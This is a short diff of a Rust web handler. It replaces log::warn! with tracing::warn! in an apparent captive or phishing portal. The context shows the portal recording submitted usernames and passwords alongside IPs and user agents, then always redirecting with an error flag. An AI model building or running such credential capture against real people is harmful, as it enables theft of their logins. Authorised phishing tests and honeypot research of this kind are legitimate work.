@@ -102,12 +102,12 @@ async fn post_capture(
 
     let creds_line = format_credentials_line(&ip, &ua, &username, &password);
     if let Err(err) = state.logger.log_credentials_line(&creds_line).await {
-        log::warn!("portal credentials log write failed: {err}");
+        tracing::warn!("portal credentials log write failed: {err}");
     }
 
     let post_line = format_visit_line(&ip, &ua, &uri.to_string(), "post");
     if let Err(err) = state.logger.log_visit_line(&post_line).await {
-        log::warn!("portal post visit log write failed: {err}");
+        tracing::warn!("portal post visit log write failed: {err}");
     }
 
     Redirect::to("/?err=1")
@@ -118,7 +118,7 @@ async fn log_visit(state: &PortalState, headers: &HeaderMap, uri: &Uri, addr: So
     let ua = user_agent(headers);
     let line = format_visit_line(&ip, &ua, &uri.to_string(), "view");
     if let Err(err) = state.logger.log_visit_line(&line).await {
-        log::warn!("portal visit log write failed: {err}");
+        tracing::warn!("portal visit log write failed: {err}");
     }
 }
 
